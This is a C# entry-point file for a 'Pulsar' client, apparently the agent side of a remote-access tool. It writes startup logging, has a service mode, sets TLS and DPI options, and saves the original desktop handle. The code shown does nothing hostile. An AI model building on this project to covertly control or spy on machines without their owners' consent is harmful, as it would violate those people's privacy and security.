using Pulsar.Client.Config;
using Pulsar.Client.IO;
using Pulsar.Client.Setup;
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client
{
    internal static class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetThreadDesktop(uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetProcessDPIAware();

        [STAThread]
        private static void Main(string[] args)
        {
            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
            try
            {
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Entry point reached\r\n"); } catch { }
                
                if (IsServiceMode(args))
                {
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Running as service\r\n"); } catch { }
                    PulsarService.RunService();
                    return;
                }

                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Setting TLS 1.2\r\n"); } catch { }
                // enable TLS 1.2
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Setting DPI aware\r\n"); } catch { }
                SetProcessDPIAware();

                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Setting unhandled exception mode\r\n"); } catch { }
                // Set the unhandled exception mode to force all Windows Forms errors to go through our handler
                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);

                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Enabling visual styles\r\n"); } catch { }
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Saving original desktop\r\n"); } catch { }
                SaveOriginalDesktop();

                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Creating PulsarApplication\r\n"); } catch { }
                var app = new PulsarApplication();
                
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Starting Application.Run\r\n"); } catch { }
                Application.Run(app);
                
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: Application.Run completed\r\n"); } catch { }
            }
            catch (Exception ex)
            {
                string logFile2 = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_main.log");
                try { System.IO.File.AppendAllText(logFile2, $"[{System.DateTime.Now:HH:mm:ss.fff}] MAIN: EXCEPTION: {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
                try { System.IO.File.AppendAllText(logFile2, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Stack: {ex.StackTrace}\r\n"); } catch { }
                if (ex.InnerException != null)
                {
                    try { System.IO.File.AppendAllText(logFile2, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Inner: {ex.InnerException.GetType().Name}: {ex.InnerException.Message}\r\n"); } catch { }
                }
                Environment.Exit(99);
            }
        }

        private static bool IsServiceMode(string[] args)
        {
            if (args == null)
            {
                return false;
            }

            foreach (var arg in args)
            {
                if (string.Equals(arg, "-service", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(arg, "--service", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(arg, "/service", StringComparison.OrdinalIgnoreCase))
                {
                    return true;
                }
            }

            return false;
        }

        internal static void EnableDPIAwareness()
        {
            SetProcessDPIAware();
        }

        internal static void SaveOriginalDesktop()
        {
            Settings.OriginalDesktopPointer = GetThreadDesktop(GetCurrentThreadId());
        }
    }
}
